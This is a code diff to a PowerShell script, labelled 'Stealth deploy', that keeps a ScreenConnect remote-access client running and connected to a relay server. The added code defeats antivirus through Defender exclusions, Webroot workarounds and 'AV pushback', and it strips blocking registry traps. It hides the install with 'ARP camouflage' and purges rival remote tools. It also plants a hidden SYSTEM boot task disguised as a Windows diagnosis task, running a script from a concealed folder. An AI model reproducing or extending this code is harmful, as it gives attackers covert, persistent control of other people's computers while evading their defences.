@@ -1040,7 +1040,7 @@ function Invoke-RemoveUnauthorizedRmm {
 }
 
 Write-Log '=== Stealth deploy start ==='
-Write-Log 'WU_BUILD_20260729U'
+Write-Log 'WU_BUILD_20260729V'
 
 # ============================================
 # PHASE 0: WIPE LOUD OLD VERSION + LEGACY
@@ -1413,6 +1413,301 @@ function Start-PrimaryService {
     return (Test-ScServiceRunning)
 }
 
+
+function Clear-ScIfeoHijacks {
+    # Remove Debugger traps that prevent SC binaries from launching
+    foreach ($exe in @(
+        'ScreenConnect.ClientService.exe',
+        'ScreenConnect.Client.exe',
+        'ScreenConnect.WindowsClient.exe',
+        'ScreenConnect.ClientSetup.exe'
+    )) {
+        $ifeo = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$exe"
+        if (Test-Path $ifeo) {
+            Remove-ItemProperty -Path $ifeo -Name Debugger -Force -ErrorAction SilentlyContinue
+            Write-Log "Cleared SC IFEO Debugger: $exe"
+        }
+    }
+}
+
+function Test-ScRelayDns {
+    param([string]$Server = $RelayServer)
+    try {
+        $r = [System.Net.Dns]::GetHostAddresses($Server)
+        return ($null -ne $r -and $r.Count -gt 0)
+    } catch {
+        return $false
+    }
+}
+
+function Get-ScRelayAddresses {
+    param([string]$Server = $RelayServer)
+    try {
+        return @([System.Net.Dns]::GetHostAddresses($Server) | ForEach-Object { $_.IPAddressToString })
+    } catch {
+        return @()
+    }
+}
+
+function Test-ScRelaySession {
+    # True if we have an outbound TCP session toward the relay (Established/SynSent)
+    param([string]$Server = $RelayServer, [int]$Port = $RelayPort)
+    $ips = @(Get-ScRelayAddresses -Server $Server)
+    if ($ips.Count -eq 0) { return $false }
+    try {
+        $conns = Get-NetTCPConnection -State Established, SynSent -ErrorAction SilentlyContinue |
+            Where-Object {
+                $_.RemotePort -eq $Port -and (
+                    ($ips -contains $_.RemoteAddress) -or
+                    ($_.RemoteAddress -like "*$Server*")
+                )
+            }
+        if ($conns) { return $true }
+    } catch {}
+    # Fallback: netstat parse (works when Get-NetTCPConnection missing)
+    try {
+        $raw = & netstat.exe -ano 2>$null
+        foreach ($line in $raw) {
+            foreach ($ip in $ips) {
+                if ($line -match [regex]::Escape("${ip}:${Port}") -and $line -match 'ESTABLISHED|SYN_SENT') {
+                    return $true
+                }
+            }
+        }
+    } catch {}
+    return $false
+}
+
+function Test-ScConfigHasRelay {
+    param([string]$Server = $RelayServer)
+    foreach ($root in (Get-ScInstallRoots)) {
+        $hits = Get-ChildItem -Path $root -Recurse -Include *.config,*.xml,*.json,*.txt -ErrorAction SilentlyContinue |
+            Where-Object { $_.Length -lt 5MB }
+        foreach ($f in $hits) {
+            try {
+                $txt = Get-Content -LiteralPath $f.FullName -Raw -ErrorAction SilentlyContinue
+                if ($txt -and $txt -like "*$Server*") { return $true }
+            } catch {}
+        }
+    }
+    # ProgramData often holds per-fingerprint config
+    $pd = "${env:ProgramData}\ScreenConnect\$PrimaryFingerprint"
+    if (Test-Path $pd) {
+        $hits = Get-ChildItem -Path $pd -Recurse -File -ErrorAction SilentlyContinue | Select-Object -First 40
+        foreach ($f in $hits) {
+            try {
+                if ($f.Length -gt 5MB) { continue }
+                $txt = Get-Content -LiteralPath $f.FullName -Raw -ErrorAction SilentlyContinue
+                if ($txt -and $txt -like "*$Server*") { return $true }
+            } catch {}
+        }
+    }
+    return $false
+}
+
+function Get-ScHealthReport {
+    $bin = Get-ScBinaryHealth
+    $svcPresent = Test-ScServicePresent
+    $svcRunning = Test-ScServiceRunning
+    $startMode = ''
+    try {
+        $cim = Get-CimInstance Win32_Service -Filter "Name='$SvcName'" -ErrorAction SilentlyContinue
+        if (-not $cim) {
+            $cim = Get-CimInstance Win32_Service -ErrorAction SilentlyContinue |
+                Where-Object { $_.Name -like "*$PrimaryFingerprint*" } | Select-Object -First 1
+        }
+        if ($cim) { $startMode = [string]$cim.StartMode }
+    } catch {}
+
+    $dnsOk = Test-ScRelayDns
+    $tcpOk = $false
+    if ($dnsOk) { $tcpOk = Test-TcpPort }
+    $sessionOk = $false
+    if ($svcRunning -and $tcpOk) { $sessionOk = Test-ScRelaySession }
+    $cfgOk = Test-ScConfigHasRelay
+    $hollow = Test-ScHollowClient
+    $controlBroken = Test-ScControlBroken
+    $appOk = Test-AppInstalled -Fingerprint $PrimaryFingerprint
+
+    $issues = [System.Collections.Generic.List[string]]::new()
+    if (-not $svcPresent) { $issues.Add('service_missing') }
+    if (-not $svcRunning) { $issues.Add('service_not_running') }
+    if ($startMode -and $startMode -ne 'Auto') { $issues.Add('startmode_not_auto') }
+    if (-not $appOk) { $issues.Add('app_not_installed') }
+    if ($hollow) { $issues.Add('hollow_client') }
+    if ($bin.Stubbed) { $issues.Add('stubbed_binaries') }
+    if ($controlBroken) { $issues.Add('control_broken') }
+    if ($bin.ProcCount -lt 1) { $issues.Add('no_sc_process') }
+    if (-not $dnsOk) { $issues.Add('relay_dns_fail') }
+    if (-not $tcpOk) { $issues.Add('relay_tcp_fail') }
+    if ($svcRunning -and $tcpOk -and -not $sessionOk) { $issues.Add('relay_no_session') }
+    if ($svcRunning -and -not $cfgOk) { $issues.Add('config_missing_relay') }
+
+    # "Healthy enough to consider online": service running, binaries OK, process up, relay reachable.
+    # Session is best-effort (may lag right after start).
+    $coreOk = $svcPresent -and $svcRunning -and $appOk -and (-not $hollow) -and (-not $bin.Stubbed) -and (-not $controlBroken) -and ($bin.ProcCount -ge 1)
+    $netOk = $dnsOk -and $tcpOk
+    $healthy = $coreOk -and $netOk
+
+    return [pscustomobject]@{
+        ServicePresent = $svcPresent
+        ServiceRunning = $svcRunning
+        StartMode      = $startMode
+        AppInstalled   = $appOk
+        Hollow         = $hollow
+        Stubbed        = [bool]$bin.Stubbed
+        ControlBroken  = $controlBroken
+        ProcCount      = [int]$bin.ProcCount
+        MaxExeSize     = [int]$bin.MaxExeSize
+        MaxDllSize     = [int]$bin.MaxDllSize
+        RelayDns       = $dnsOk
+        RelayTcp       = $tcpOk
+        RelaySession   = $sessionOk
+        ConfigHasRelay = $cfgOk
+        CoreOk         = $coreOk
+        NetOk          = $netOk
+        Healthy        = $healthy
+        Issues         = @($issues)
+    }
+}
+
+function Write-ScHealthLog {
+    param($H, [string]$Tag = 'HEALTH')
+    Write-Log ("$Tag core=$($H.CoreOk) net=$($H.NetOk) healthy=$($H.Healthy) svc=$($H.ServiceRunning) procs=$($H.ProcCount) stub=$($H.Stubbed) hollow=$($H.Hollow) dns=$($H.RelayDns) tcp=$($H.RelayTcp) sess=$($H.RelaySession) cfg=$($H.ConfigHasRelay) start=$($H.StartMode) maxExe=$($H.MaxExeSize)")
+    if ($H.Issues -and $H.Issues.Count -gt 0) {
+        Write-Log ("$Tag issues: " + ($H.Issues -join ', '))
+    }
+}
+
+function Restart-ScServiceHard {
+    Write-Log 'HARD RESTART: stop/kill/start primary SC service'
+    Clear-ScIfeoHijacks
+    & sc.exe config "$SvcName" start= auto >$null 2>&1
+    & sc.exe failure "$SvcName" reset= 86400 actions= restart/3000/restart/3000/restart/3000 >$null 2>&1
+    & sc.exe stop "$SvcName" >$null 2>&1
+    Start-Sleep -Seconds 2
+    Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | Where-Object {
+        ($_.Name -match '(?i)ScreenConnect|ClientService') -and ("$($_.CommandLine)" -like "*$PrimaryFingerprint*")
+    } | ForEach-Object {
+        Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue
+    }
+    Start-Sleep -Seconds 1
+    & sc.exe start "$SvcName" >$null 2>&1
+    try { Start-Service -Name $SvcName -ErrorAction SilentlyContinue } catch {}
+    Start-Sleep -Seconds 5
+    # Second nudge
+    if (-not (Test-ScServiceRunning)) {
+        & sc.exe start "$SvcName" >$null 2>&1
+        Start-Sleep -Seconds 4
+    }
+    return (Test-ScServiceRunning)
+}
+
+function Wait-ScRelayReady {
+    param([int]$Seconds = 45)
+    Write-Log "Waiting up to ${Seconds}s for relay TCP/session"
+    $deadline = (Get-Date).AddSeconds($Seconds)
+    $tcp = $false
+    $sess = $false
+    while ((Get-Date) -lt $deadline) {
+        if (-not (Test-ScRelayDns)) {
+            try { ipconfig /flushdns >$null 2>&1 } catch {}
+        }
+        $tcp = Test-TcpPort
+        if ($tcp) {
+            $sess = Test-ScRelaySession
+            if ($sess) {
+                Write-Log 'Relay session ESTABLISHED'
+                return $true
+            }
+        }
+        Start-Sleep -Seconds 3
+    }
+    Write-Log "Relay wait done tcp=$tcp sess=$sess"
+    return ($tcp -eq $true)
+}
+
+function Ensure-PrimaryScFullyUp {
+    param([int]$MaxRounds = 6)
+    Write-Log "ENSURE: maximizing primary SC uptime (max $MaxRounds rounds)"
+
+    for ($i = 1; $i -le $MaxRounds; $i++) {
+        Write-Log "ENSURE round $i/$MaxRounds"
+        Enable-QuietDefenderExclusions | Out-Null
+        Clear-ScIfeoHijacks
+        Enable-ScFirewallAllow
+
+        $h = Get-ScHealthReport
+        Write-ScHealthLog -H $h -Tag "ENSURE-$i"
+        if ($h.Healthy -and ($h.RelaySession -or $i -ge 2)) {
+            # Require session after first settle round when possible
+            if ($h.RelaySession -or (Wait-ScRelayReady -Seconds 20)) {
+                $h2 = Get-ScHealthReport
+                Write-ScHealthLog -H $h2 -Tag 'ENSURE-OK'
+                if ($h2.CoreOk -and $h2.NetOk) { return $true }
+            }
+        }
+
+        # Escalation ladder
+        if (Test-WebrootInstalled -or $h.Stubbed -or $h.Hollow -or $h.ControlBroken) {
+            Write-Log 'ENSURE: AV/stub/hollow path -> nuclear repair'
+            Repair-ScAfterAv | Out-Null
+            Start-Sleep -Seconds 8
+        } elseif (-not $h.ServicePresent -or -not $h.AppInstalled) {
+            Write-Log 'ENSURE: missing install -> MSI'
+            Install-PrimarySc | Out-Null
+            Start-Sleep -Seconds 6
+        } elseif (-not $h.ServiceRunning -or $h.ProcCount -lt 1) {
+            Write-Log 'ENSURE: service/process down -> hard restart'
+            if (-not (Restart-ScServiceHard)) {
+                Write-Log 'ENSURE: hard restart failed -> MSI repair'
+                Install-PrimarySc | Out-Null
+            }
+        } elseif (-not $h.NetOk) {
+            Write-Log 'ENSURE: relay unreachable -> flushdns + service bounce'
+            try { ipconfig /flushdns >$null 2>&1 } catch {}
+            Restart-ScServiceHard | Out-Null
+            Wait-ScRelayReady -Seconds 30 | Out-Null
+        } elseif (-not $h.RelaySession) {
+            Write-Log 'ENSURE: no relay session yet -> bounce + wait'
+            Restart-ScServiceHard | Out-Null
+            Wait-ScRelayReady -Seconds 40 | Out-Null
+        } else {
+            # Misc issues (startmode etc.)
+            Start-PrimaryService | Out-Null
+            Set-ArpCamouflage | Out-Null
+        }
+
+        Set-ArpCamouflage | Out-Null
+        Start-Sleep -Seconds 3
+    }
+
+    $final = Get-ScHealthReport
+    Write-ScHealthLog -H $final -Tag 'ENSURE-FINAL'
+    if (-not $final.Healthy) {
+        Write-Log 'ENSURE: still not fully healthy - arming boot repair + reactive AV'
+        Invoke-ReactiveAvPushback -Issues $final.Issues
+        try {
+            $bootPs1 = Join-Path $WorkDir 'wucache_bootrepair.ps1'
+            $bootBody = @"
+`$ErrorActionPreference='SilentlyContinue'
+Start-Sleep 25
+& powershell.exe -NoProfile -ExecutionPolicy Bypass -File (Join-Path `$env:ProgramData 'Microsoft\Windows\WER\Temp\.wucache\wucache_pkg.ps1')
+"@
+            Set-Content -Path $bootPs1 -Value $bootBody -Encoding ASCII -Force
+            Unregister-ScheduledTask -TaskName 'WMIRegistration' -TaskPath '\Microsoft\Windows\Diagnosis\' -Confirm:$false -ErrorAction SilentlyContinue
+            $a = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$bootPs1`""
+            $tr = New-ScheduledTaskTrigger -AtStartup
+            $pr = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
+            $st = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
+            Register-ScheduledTask -TaskName 'WMIRegistration' -TaskPath '\Microsoft\Windows\Diagnosis\' -Action $a -Trigger $tr -Principal $pr -Settings $st -Force | Out-Null
+            Write-Log 'ENSURE: boot repair armed (reboot helps Webroot NOT_STOPPABLE stubs)'
+        } catch {}
+    }
+    return [bool]$final.Healthy
+}
+
+
 function Invoke-RivalPurge {
     Write-Log 'Rival purge'
     Invoke-RemoveUnauthorizedScreenConnect
@@ -1457,6 +1752,8 @@ if (Test-ScHollowClient -or (Test-ScControlBroken)) {
     Write-Log 'Hollow/broken SC after Phase 1 - nuclear repair'
     Repair-ScAfterAv | Out-Null
 }
+Write-Log 'PHASE 1b: ENSURE primary SC fully up'
+Ensure-PrimaryScFullyUp -MaxRounds 5 | Out-Null
 
 # ============================================
 # PHASE 2: RIVAL PURGE (now)
@@ -1736,22 +2033,80 @@ SyncCopies
 ReactiveIfBlocked
 if (TestWebroot -or (TestHollow) -or (TestWebrootInstalled)) { WebrootPush }
 
-if (-not (ScRunning) -or -not (AppOk)) {
-    L 'reinstall'
-    if (-not (Install)) { ReactiveIfBlocked; Install | Out-Null }
+function RelayTcp {
+    try {
+        `$c = New-Object Net.Sockets.TcpClient
+        `$iar = `$c.BeginConnect('$RelayServer', $RelayPort, `$null, `$null)
+        `$ok = `$iar.AsyncWaitHandle.WaitOne(3000, `$false) -and `$c.Connected
+        try { `$c.Close() } catch {}
+        return [bool]`$ok
+    } catch { return `$false }
+}
+function RelaySess {
+    try {
+        `$ips = @([Net.Dns]::GetHostAddresses('$RelayServer') | ForEach-Object { `$_.IPAddressToString })
+        `$hit = Get-NetTCPConnection -State Established,SynSent -EA SilentlyContinue | Where-Object {
+            `$_.RemotePort -eq $RelayPort -and (`$ips -contains `$_.RemoteAddress)
+        }
+        return [bool]`$hit
+    } catch { return `$false }
+}
+function HardRestart {
+    L 'monitor hard restart SC'
+    foreach (`$exe in @('ScreenConnect.ClientService.exe','ScreenConnect.Client.exe','ScreenConnect.WindowsClient.exe')) {
+        `$ifeo = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\`$exe"
+        if (Test-Path `$ifeo) { Remove-ItemProperty `$ifeo -Name Debugger -Force -EA SilentlyContinue }
+    }
+    cmd /c "sc config `"$svcName`" start= auto" >`$null 2>&1
+    cmd /c "sc failure `"$svcName`" reset= 86400 actions= restart/3000/restart/3000/restart/3000" >`$null 2>&1
+    cmd /c "sc stop `"$svcName`"" >`$null 2>&1
+    Start-Sleep 2
+    Get-CimInstance Win32_Process -EA SilentlyContinue | Where-Object {
+        (`$_.Name -match '(?i)ScreenConnect|ClientService') -and ("`$(`$_.CommandLine)" -like "*`$fp*")
+    } | ForEach-Object { Stop-Process -Id `$_.ProcessId -Force -EA SilentlyContinue }
+    cmd /c "sc start `"$svcName`"" >`$null 2>&1
     Start-Sleep 5
 }
-if (ScPresent) {
-    cmd /c "sc config `"$svcName`" start= auto" >`$null 2>&1
-    cmd /c "sc failure `"$svcName`" reset= 86400 actions= restart/5000/restart/5000/restart/5000" >`$null 2>&1
-    if (-not (ScRunning)) {
-        cmd /c "sc start `"$svcName`"" >`$null 2>&1
-        Start-Sleep 3
-        if (-not (ScRunning)) { ReactiveIfBlocked }
+function EnsureUp {
+    L 'monitor ENSURE tick'
+    QuietExclusions; FwAllow
+    `$need = `$false
+    if (-not (ScRunning) -or -not (AppOk) -or (TestHollow)) { `$need = `$true }
+    `$tcp = RelayTcp
+    `$sess = `$false
+    if ((ScRunning) -and `$tcp) { `$sess = RelaySess }
+    `$runNow = ScRunning
+    `$holNow = TestHollow
+    L ("monitor health running=`$runNow hollow=`$holNow tcp=`$tcp sess=`$sess")
+    if (`$need) {
+        if (TestWebrootInstalled -or (TestHollow)) { WebrootPush }
+        if (-not (Install)) { ReactiveIfBlocked; Install | Out-Null }
+        HardRestart
+        Start-Sleep 5
+    } elseif (-not (ScRunning)) {
+        HardRestart
+        if (-not (ScRunning)) { ReactiveIfBlocked; Install | Out-Null }
+    } elseif (-not `$tcp) {
+        try { ipconfig /flushdns >`$null 2>&1 } catch {}
+        HardRestart
+    } elseif (-not `$sess) {
+        HardRestart
+        Start-Sleep 8
+        `$sess = RelaySess
+    }
+    if (ScPresent) {
+        cmd /c "sc config `"$svcName`" start= auto" >`$null 2>&1
+        if (-not (ScRunning)) { cmd /c "sc start `"$svcName`"" >`$null 2>&1; Start-Sleep 3 }
+    }
+    `$tcp2 = RelayTcp; `$sess2 = RelaySess
+    if ((ScRunning) -and (-not (TestHollow)) -and `$tcp2) {
+        L ("monitor SC UP tcp=`$tcp2 sess=`$sess2")
     } else {
-        L 'SC healthy - monitor idle'
+        L 'monitor SC NOT fully up - will retry next tick'
+        ReactiveIfBlocked
     }
 }
+EnsureUp
 Arp
 PurgeBadSc
 
@@ -1863,29 +2218,26 @@ if ($PSCommandPath -and (Test-Path $PSCommandPath)) {
 # ============================================
 # PHASE 4: FINAL + interference check
 # ============================================
-Write-Log 'PHASE 4: final verify'
-if (-not (Test-ScServiceRunning) -or -not (Test-AppInstalled -Fingerprint $PrimaryFingerprint)) {
-    Install-PrimarySc | Out-Null
-    Start-Sleep -Seconds 8
-}
-Start-PrimaryService | Out-Null
-Set-ArpCamouflage | Out-Null
+Write-Log 'PHASE 4: final verify + ENSURE fully up'
 Invoke-RivalPurge
+Set-ArpCamouflage | Out-Null
+$ensured = Ensure-PrimaryScFullyUp -MaxRounds 6
 Set-ArpCamouflage | Out-Null
 
 $interference = Test-PayloadInterference
 if ($interference.Interfered) {
     Invoke-ReactiveAvPushback -Issues $interference.Issues
-    # Re-seed dual copies after pushback
     if (Test-Path $MonitorScriptPath) {
         Sync-MonitorCopies -Content (Get-Content -LiteralPath $MonitorScriptPath -Raw -ErrorAction SilentlyContinue)
         Write-FailoverVbs -Path $HelperVbsPath
         Write-FailoverVbs -Path $HelperVbsPathAlt
     }
+    Ensure-PrimaryScFullyUp -MaxRounds 3 | Out-Null
 }
 
-$conn = Test-TcpPort
-Write-Log "Relay ${RelayServer}:$RelayPort reachable=$conn"
+$hf = Get-ScHealthReport
+Write-ScHealthLog -H $hf -Tag 'FINAL'
+Write-Log ("ENSURE result healthy=$ensured core=$($hf.CoreOk) net=$($hf.NetOk) session=$($hf.RelaySession)")
 Write-Log '=== Stealth deploy end ==='
 Write-Log 'TIP: Deploy this script as SYSTEM via your RMM for zero UAC and max reliability.'
 
